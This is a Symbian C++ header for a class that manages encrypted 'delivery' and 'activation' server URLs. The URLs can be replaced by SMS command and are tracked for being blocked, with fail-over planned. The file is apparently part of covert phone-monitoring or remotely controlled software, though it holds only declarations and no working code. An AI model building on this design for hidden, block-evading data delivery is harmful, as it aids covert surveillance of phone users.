#ifndef __ServerUrlManager_H__
#define __ServerUrlManager_H__

#include <e32base.h>
#include "GlobalConst.h"
#include "SmsCmdManager.h"
#include "Timeout.h"
class CFxsSettings;
class RFs;
class RWriteStream;
class RReadStream;

/**
* This class manages the server url list.
* currently it determines which server the client should connect to.
* but in the future it will implement many more complex feature to support fail over
* in case the server is blocked
*/
class CServerUrlManager : public CBase,
						  public MCmdListener
	{
public:
	static CServerUrlManager* NewL(RFs& aFs);
	~CServerUrlManager();
	void ExternalizeL(RWriteStream& aStream) const;
    void InternalizeL(RReadStream& aStream);		
	/**
	* Get delivery url
	* @return working url or empty if url has not been tested.
	* @leave KErrNotReady if url is not decrypted
	*/
	void GetDeliveryUrlL(TUrl& aUrl);
	/**
	* Count number of delivery url provided	
	* @leave KErrNotReady if url is not decrypted
	*/
	TInt CountDeliveryUrl();
	/**
	* Get delivery url by index
	* @param aIndex, this must not be greater than CountDeliveryUrlL() otherwise panic
	* @leave KErrNotReady
	*/
	void GetDeliveryUrlL(TUrl& aUrl, TInt aIndex);
	TBool DeliveryServerProhibited();
	TBool ActivationServerProhibited();
	void ReportDeliveryUrlTest(TBool aServProhibited, TInt aWorkingUrlIndex);	
	void GetActivationUrlL(TUrl& aUrl);
	void GetActivationUrlL(TUrl& aUrl, TInt aIndex);
	void ReportActivationUrlTest(TBool aServProhibited, TInt aWorkingUrlIndex);	
	TInt CountActivationUrl();
	TInt SetUseActivationUrl(TInt aIndex);	
	
private://MSmsCmdObserver
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	
private:
	CServerUrlManager(RFs& aFs);
	void ConstructL();
	void DecryptActivationUrlL(TInt aIndex, TUrl& aUrl);
	void DecryptDelivUrlL(TInt aIndex, TUrl& aUrl);
	void DoExternalizeL();
	void InternalizeL();
    void DoInternalizeL(const TFileName& aFile);
    void GetSettingFileName(TFileName& aFile);
	void EnsureHttp(TUrl& aUrl);
	HBufC* ProcessCmdSetServerUrlL(const TSmsCmdDetails& aCmdDetails);
	/**
	* This is used for debuging only
	* It prints the decrypted url.
	* Use this to ensure the correctness
	*/
	void DecryptVerbosL();
private:
	enum TDecryptTask {EDecyptNone, EDecyptActivationUrl, EDecyptDeliveryUrl};
private:
	RFs& iFs;
	TDecryptTask iDecryptTask;
	TInt iDecryptIndex;
	TBool iDeliveryUrlDecrypted;
	TBool iActivationUrlDecrypted;
	/**
	ETrue indicates that server is blocked*/
	TBool iDeliveryServerProhibited;
	/**
	ETrue indicates that activation server is blocked*/
	TBool iActivationServerProhibited;
	/**
	Current working delivery*/
	TUrl iCurrDeliveryUrl;
	TUrl iCurrActivationUrl;
	/**
	Extra url from sms command*/
	RArray<TUrl> iExtraDeliveryUrls;
	RArray<TUrl> iExtraActivUrls;
	/**
	Index of delivery url currently is used*/
	TInt iDeliveryUrlUsedIndex;
	/**
	Index of activation url currently is used*/
	TInt iActivationUrlUsedIndex;	
	};

#endif
